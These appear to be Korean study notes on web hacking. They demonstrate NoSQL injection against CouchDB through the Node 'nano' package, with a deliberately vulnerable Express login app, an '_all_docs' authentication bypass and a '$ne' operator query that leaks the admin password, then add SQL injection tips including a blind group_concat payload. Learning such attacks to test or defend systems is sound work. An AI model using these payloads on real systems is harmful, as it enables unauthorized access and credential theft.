	_all_docs 페이지 접근
		이용자의 입력값을 get 함수의 인자로 사용할 경우 문제가 발생할 수 있음
		nano 패키지의 get 함수는 전달된 인자에 대해 앞서 배운 특수 구성 요소의 포함 여부를 검사하지 않기 때문에 공격자는 특성 구성 요소를 통해 데이터베이스의 정보를 획득할 수 있음
		Figure 5,6은 각각 올바르게 데이터를 조회하는 모습과 _all_docs 페이지에 접근해 데이터베이스의 정보를 획득한 모습

			//정상적인 접근

			> require('nano')('http://{username}:{password}@localhost:5984').use('users').get('guest', function(err, result){ console.log('err: ', err, ',result: ', result) })

			/*
			err:  null ,result:  { _id: 'guest',
			  _rev: '1-22a458e50cf189b17d50eeb295231896',
			  upw: 'guest' }
			*/

			//_all_docs 페이지 접근

			> require('nano')('http://{username}:{password}@localhost:5984').use('users').get('_all_docs', function(err, result){ console.log('err: ', err, ',result: ', result) })

			/*
			err:  null ,result:  { total_rows: 3,
			  offset: 0,
			  rows:
			   [ { id: '0c1371b65480420e678d00c2770003f3',
			       key: '0c1371b65480420e678d00c2770003f3',
			       value: [Object] },
			     { id: '0c1371b65480420e678d00c277001712',
			       key: '0c1371b65480420e678d00c277001712',
			       value: [Object] },
			     { id: 'guest', key: 'guest', value: [Object] } ] }
			*/

		다음은 공격 예시

			//app.js 예제 코드

			const express = require('express');
			const session = require('express-session');
			const app = express();
			app.use(express.json());
			app.use(express.urlencoded({extended: false}));
			app.use(session({'secret': 'secret'}));
			const nano = require('nano')('http://{username}:{password}@localhost:5984');
			const users = nano.db.use('users');
			// { _id: 'admin', _rev: '1-22a458e50cf189b17d50eeb295231896', upw: '**secret**' }
			app.post('/auth', function(req, res) {
			    users.get(req.body.uid, function(err, result) {
			        if (err) {
			            res.send('error');
			            return;
			        }
			        if (result.upw === req.body.upw) {
			            req.session.auth = true;
			            res.send('success');
			        } else {
			            res.send('fail');
			        }
			    });
			});
			const server = app.listen(3000, function() {
			    console.log('app.listen');
			});

		정상적인 요청
			/auth 페이지에서 uid 값을 “admin”으로 전달하면 Figure 11과 같은 결과를 볼 수 있음
			이는 uid를 "admin"을 전달하고, 응답 헤더를 출력하는 명령어를 입력한 모습
			응답 결과를 살펴보면, uid가 "admin"인 데이터가 조회된 것을 확인할 수 있음
			애플리케이션 내부에서는 result 변수에 조회한 데이터의 값이 저장되고, 
			쿼리 실행이 정상적으로 이뤄졌기 때문에 err 변수에는 null이 저장됨
			또한, 조회한 데이터의 upw와 이용자가 전달한 upw를 비교하는 조건문에서 result.upw에는 "secretpassword" 문자열이 저장됨

				//admin uid 조회

				$ curl -i http://{username}:{password}@localhost:5984/users/admin
				HTTP/1.1 200 OK
				Cache-Control: must-revalidate
				Content-Length: 83
				Content-Type: application/json
				Date: Tue, 19 May 2020 16:47:49 GMT
				ETag: "2-142ddb6e06fd298e86fa54f9b3b9d7f2"
				Server: CouchDB/3.1.0 (Erlang OTP/20)
				X-Couch-Request-ID: 028e8b621c
				X-CouchDB-Body-Time: 0
				{"_id":"admin","_rev":"2-142ddb6e06fd298e86fa54f9b3b9d7f2","upw":"secretpassword"}

		유효하지 않은 uid 입력
			/auth 페이지에서 uid 값을 데이터베이스에 존재하지 않는 문자열을 전달하면 Figure 12와 같은 결과를 볼 수 있음
			결과의 "404 Object Not Found"를 통해 에러가 발생한 것을 알 수 있음
			에러가 발생했기 때문에 애플리케이션 내부에서 result 변수는 null이 저장되고, 
			err 변수에는 요청에 대한 에러 정보가 저장됨
			따라서 애플리케이션 코드의 12 번째 줄 조건을 만족하게 되고, 조건문에 해당하는 코드가 실행됨.

				//유효하지 않은 uid 조회

				$ curl -i http://{username}:{password}@localhost:5984/users/undefined_user
				HTTP/1.1 404 Object Not Found
				Cache-Control: must-revalidate
				Content-Length: 41
				Content-Type: application/json
				Date: Tue, 19 May 2020 17:07:14 GMT
				Server: CouchDB/3.1.0 (Erlang OTP/20)
				X-Couch-Request-ID: be30c84acd
				X-CouchDB-Body-Time: 0
				{"error":"not_found","reason":"missing"}

		_all_docs를 이용한 인증 우회
			/auth 페이지에서 uid 값에 특수 구성 요소인 _all_docs를 입력하고, 
			upw를 입력하지 않은 모습은 아래와 같음
			결과를 살펴보면, 인증에 성공하고 세션을 획득한 것을 알 수 있음

			애플리케이션 내부에서는 _all_docs에서 출력하는 내용을 result 변수에 저장함
			그러나 해당 페이지에서는 키 명칭이 upw인 데이터를 반환하지 않기 때문에 result.upw에는 undefined가 저장
			요청을 다시 확인해보면 upw를 별도로 전달하지 않았기 때문에 req.body.upw 또한 undefined가 되고, 
			결국 인증 조건을 만족하고 세션을 획득할 수 있게 됩니다.

				//_all_docs를 이용한 인증 우회

				$ curl -i http://{username}:{password}@localhost:5984/users/_all_docs
				HTTP/1.1 200 OK
				Cache-Control: must-revalidate
				Content-Type: application/json
				Date: Tue, 19 May 2020 17:24:32 GMT
				Server: CouchDB/3.1.0 (Erlang OTP/20)
				Transfer-Encoding: chunked
				X-Couch-Request-ID: 43c8ca548f
				X-CouchDB-Body-Time: 0
				{"total_rows":1,"offset":0,"rows":[
				{"id":"admin","key":"admin","value":{"rev":"2-142ddb6e06fd298e86fa54f9b3b9d7f2"}}
				]}

	nano 패키지 find 함수 + 연산자 공격
		아래는 find 함수의 코드
		먼저, find 함수의 3번째 줄을 보면, 전달된 쿼리가 NULL인지와 객체 타입이 아닌지를 검사하고 에러를 발생시킴
		따라서 객체 형태의 데이터를 전달할 수 있는 것을 알 수 있음

			// https://github.com/apache/couchdb-nano/blob/befbcd9972520faa8850c9425faeb324aab005f5/lib/nano.js#L941-L952
			function find (query, callback) {
			  if (missing(query) || typeof query !== 'object') {
			    return callbackOrRejectError(callback)
			  }
			  return relax({
			    db: dbName,
			    path: '_find',
			    method: 'POST',
			    body: query
			  }, callback)
			}

		객체 형태의 데이터를 입력받을 때 입력 값에 대한 검사가 부재하거나 미흡하다면 문제가 발생할 수 있음
		selector 안에서 operator를 사용할 수 있는데, 연산자가 이에 포함됨
		따라서 공격자가 조건 식을 만들고, 조건에 해당하지 않는 데이터를 모두 획득할 수 있음
		아래는 각각 올바르게 데이터를 조회하는 모습과 연산자를 통해 데이터베이스의 중요 정보를 획득한 모습
		이처럼 find 함수의 인자로 이용자의 입력 값이 전달되고, 문자열 타입이 아닌 객체 타입의 값을 입력할 수 있다면 데이터베이스의 중요 정보를 획득할 수 있음

			//정상적인 쿼리 전송

			> require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'guest', 'upw': 'guest'}}, function(err, result){ console.log('err: ', err, ',result: ', result) })

			/*
			undefined
			err:  null ,result:  { docs:
			   [ { _id: 'guest',
			       _rev: '1-22a458e50cf189b17d50eeb295231896',
			       upw: 'guest' } ],
			  bookmark:
			   'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzppemFpeAJDlgkgjhLADZAxEP',
			  warning:
			   'No matching index found, create an index to optimize query time.' }
			*/

			//연산자를 포함한 공격 쿼리 전송

			> require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'admin', 'upw': {'$ne': ''}}}, function(err, result){ console.log('err: ', err, ',result: ', result) })

			/*
			undefined
			err:  null ,result:  { docs:
			   [ { _id: 'admin',
			       _rev: '2-142ddb6e06fd298e86fa54f9b3b9d7f2',
			       upw: 'secretpassword' } ],
			  bookmark:
			   'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzJqbkZuaBJDlgkgjhLADVNBDR',
			  warning:
			   'No matching index found, create an index to optimize query time.' }
			*/





# tip
union select 컬럼개수 맞추기
' union select 1,2,3,4,5,6 이런식으로 노가다하는거보단
order by 8 이런식으로 하는게 찾기 편함
그리고 허용이 된다면 sqlmap이 최고

group_concat
자동화 스크립트 사용할 때, 동시에 여러컬럼의 데이터를 가져와야하는경우가 있다.
이때, group_concat을 사용하면 동시에 여러 컬럼데이터를 참조할 수 있다.
	31 and substring((select group_concat(table_name,0x3a,column_name) from information_schema.columns  WHERE table_schema = 'flag'),1,1)="w";